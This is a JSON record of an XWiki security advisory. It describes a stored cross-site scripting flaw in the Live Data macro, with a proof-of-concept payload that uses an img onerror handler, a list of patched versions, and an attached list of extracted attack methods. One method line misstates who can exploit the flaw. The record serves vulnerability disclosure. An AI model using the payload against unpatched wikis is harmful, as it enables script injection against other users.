{"description": "### Impact\nA user without script rights can introduce a stored XSS by using the Live Data macro, if the last author of the content of the page has script rights.\n\nFor instance, by adding the LiveData below in the about section of the profile of a user created by an admin.\n\n```javascript\n{{liveData id=\"movies\" properties=\"title,description\"}}\n{\n  \"data\": {\n    \"count\": 1,\n    \"entries\": [\n      {\n        \"title\": \"Meet John Doe\",\n        \"url\": \"https://www.imdb.com/title/tt0033891/\",\n        \"description\": \"<img onerror='alert(1)' src='foo' />\"\n      }\n    ]\n  },\n  \"meta\": {\n    \"propertyDescriptors\": [\n      {\n        \"id\": \"title\",\n        \"name\": \"Title\",\n        \"visible\": true,\n        \"displayer\": {\"id\": \"link\", \"propertyHref\": \"url\"}\n      },\n      {\n        \"id\": \"description\",\n        \"name\": \"Description\",\n        \"visible\": true,\n        \"displayer\": \"html\"\n      }\n    ]\n  }\n}\n{{/liveData}}\n```\n\n### Patches\nThis has been patched in XWiki 14.10, 14.4.7, and 13.10.11.\n\n### Workarounds\nNo known workaround.\n\n### References\n- https://jira.xwiki.org/browse/XWIKI-20312\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [Jira](http://jira.xwiki.org/)\n* Email us at [Security ML](mailto:security@xwiki.org)\n", "methods": ["Stored Cross-site Scripting (XSS) via the Live Data macro.", "User with script rights can introduce a stored XSS.", "Added malicious content in the about section of a user's profile.", "Used JavaScript to execute malicious code.", "Used an image tag with an onerror attribute to execute malicious code."]}